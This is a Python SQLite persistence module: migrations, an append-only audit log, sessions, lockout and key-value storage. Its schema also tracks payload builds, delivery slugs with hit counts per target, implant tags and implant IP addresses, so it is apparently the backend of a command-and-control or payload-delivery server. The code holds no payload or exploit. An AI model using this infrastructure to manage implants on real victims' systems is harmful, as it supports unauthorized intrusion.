"""SQLite persistence: schema, migrations, audit log, sessions, lockout, builds.

One connection per operation, short-lived, guarded by a process-wide lock. The
audit table is append-only, enforced by triggers so a stray UPDATE/DELETE fails
loudly instead of silently rewriting history.
"""

from __future__ import annotations

import sqlite3
import threading
import time
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path

MIGRATIONS: list[str] = [
    # v1 — core
    """
    CREATE TABLE audit (
        id      INTEGER PRIMARY KEY AUTOINCREMENT,
        ts      REAL    NOT NULL,
        actor   TEXT    NOT NULL,
        action  TEXT    NOT NULL,
        target  TEXT    NOT NULL DEFAULT '',
        result  TEXT    NOT NULL,
        detail  TEXT    NOT NULL DEFAULT ''
    );
    CREATE INDEX idx_audit_ts ON audit(ts);

    CREATE TRIGGER audit_no_update BEFORE UPDATE ON audit
        BEGIN SELECT RAISE(ABORT, 'audit is append-only'); END;
    CREATE TRIGGER audit_no_delete BEFORE DELETE ON audit
        BEGIN SELECT RAISE(ABORT, 'audit is append-only'); END;

    CREATE TABLE sessions (
        id        TEXT PRIMARY KEY,
        actor     TEXT NOT NULL,
        created   REAL NOT NULL,
        last_seen REAL NOT NULL,
        ip        TEXT NOT NULL DEFAULT '',
        ua        TEXT NOT NULL DEFAULT '',
        csrf      TEXT NOT NULL,
        valid     INTEGER NOT NULL DEFAULT 1
    );

    CREATE TABLE lockout (
        key          TEXT PRIMARY KEY,
        fails        INTEGER NOT NULL DEFAULT 0,
        last_fail    REAL NOT NULL DEFAULT 0,
        locked_until REAL NOT NULL DEFAULT 0
    );

    CREATE TABLE kv (
        k TEXT PRIMARY KEY,
        v TEXT NOT NULL
    );
    """,
    # v2 — builds, delivery slugs, implant tags
    """
    CREATE TABLE artifacts (
        id         TEXT PRIMARY KEY,
        ts         REAL NOT NULL,
        os         TEXT NOT NULL,
        arch       TEXT NOT NULL,
        fmt        TEXT NOT NULL,
        transport  TEXT NOT NULL,
        name       TEXT NOT NULL,
        path       TEXT NOT NULL,
        sha256     TEXT NOT NULL,
        size       INTEGER NOT NULL,
        build_id   TEXT NOT NULL DEFAULT '',
        slug       TEXT NOT NULL DEFAULT '',
        delivery   TEXT NOT NULL DEFAULT '',
        doc_name   TEXT NOT NULL DEFAULT ''
    );
    CREATE INDEX idx_artifacts_ts ON artifacts(ts);

    CREATE TABLE slugs (
        slug       TEXT PRIMARY KEY,
        artifact_id TEXT NOT NULL,
        created    REAL NOT NULL,
        first_hit  REAL NOT NULL DEFAULT 0,
        hits       INTEGER NOT NULL DEFAULT 0,
        target     TEXT NOT NULL DEFAULT ''
    );

    CREATE TABLE tags (
        session_id TEXT PRIMARY KEY,
        tags       TEXT NOT NULL DEFAULT '',
        updated    REAL NOT NULL
    );

    CREATE TABLE implant_ip (
        session_id TEXT PRIMARY KEY,
        public_ip  TEXT NOT NULL DEFAULT '',
        local_ips  TEXT NOT NULL DEFAULT '',
        updated    REAL NOT NULL
    );
    """,
]


class Database:
    def __init__(self, path: Path | str) -> None:
        self.path = str(path)
        self._lock = threading.RLock()

    @contextmanager
    def connect(self) -> Iterator[sqlite3.Connection]:
        with self._lock:
            conn = sqlite3.connect(self.path, timeout=30.0)
            conn.row_factory = sqlite3.Row
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA busy_timeout=30000")
            try:
                yield conn
                conn.commit()
            finally:
                conn.close()

    def migrate(self) -> int:
        with self.connect() as conn:
            conn.execute("CREATE TABLE IF NOT EXISTS schema_version (version INTEGER NOT NULL)")
            row = conn.execute("SELECT version FROM schema_version").fetchone()
            current = int(row["version"]) if row else 0
            for index, script in enumerate(MIGRATIONS, start=1):
                if index <= current:
                    continue
                conn.executescript(script)
                current = index
            if row:
                conn.execute("UPDATE schema_version SET version = ?", (current,))
            else:
                conn.execute("INSERT INTO schema_version (version) VALUES (?)", (current,))
            return current

    # -- audit ---------------------------------------------------------------
    def audit(
        self,
        actor: str,
        action: str,
        result: str,
        target: str = "",
        detail: str = "",
    ) -> None:
        with self.connect() as conn:
            conn.execute(
                "INSERT INTO audit (ts, actor, action, target, result, detail) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (time.time(), actor, action, target, result, detail),
            )

    def recent_audit(self, limit: int = 200) -> list[sqlite3.Row]:
        with self.connect() as conn:
            return list(conn.execute("SELECT * FROM audit ORDER BY id DESC LIMIT ?", (limit,)))

    def audit_csv(self, limit: int = 100000) -> list[sqlite3.Row]:
        with self.connect() as conn:
            return list(conn.execute("SELECT * FROM audit ORDER BY id ASC LIMIT ?", (limit,)))

    # -- kv ------------------------------------------------------------------
    def kv_get(self, key: str, default: str | None = None) -> str | None:
        with self.connect() as conn:
            row = conn.execute("SELECT v FROM kv WHERE k = ?", (key,)).fetchone()
            return row["v"] if row else default

    def kv_set(self, key: str, value: str) -> None:
        with self.connect() as conn:
            conn.execute(
                "INSERT INTO kv (k, v) VALUES (?, ?) ON CONFLICT(k) DO UPDATE SET v = excluded.v",
                (key, value),
            )
